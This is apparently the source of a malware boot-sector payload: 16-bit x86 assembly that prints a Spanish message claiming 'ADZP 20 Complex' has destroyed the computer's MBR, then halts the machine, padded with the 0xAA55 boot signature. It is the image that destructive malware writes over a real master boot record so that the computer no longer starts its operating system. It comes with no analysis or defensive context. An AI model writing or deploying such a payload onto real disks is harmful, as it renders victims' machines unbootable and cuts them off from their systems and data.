[BITS 16]
[ORG 0x7C00]

start:
    mov ax, 0x0003
    int 0x10

    mov si, msg

.print:
    lodsb
    cmp al, 0
    je .hang

    mov ah, 0x0E
    mov bh, 0x00
    mov bl, 0x00
    int 0x10
    jmp .print

.hang:
    cli
    hlt
    jmp .hang

msg db 13, 10, "Error: No se ha podido acceder al MBR", 13, 10, "ADZP 20 Complex ha destruido el MBR de tu computadora.",0

times 510 - ($ - $$) db 0
dw 0xAA55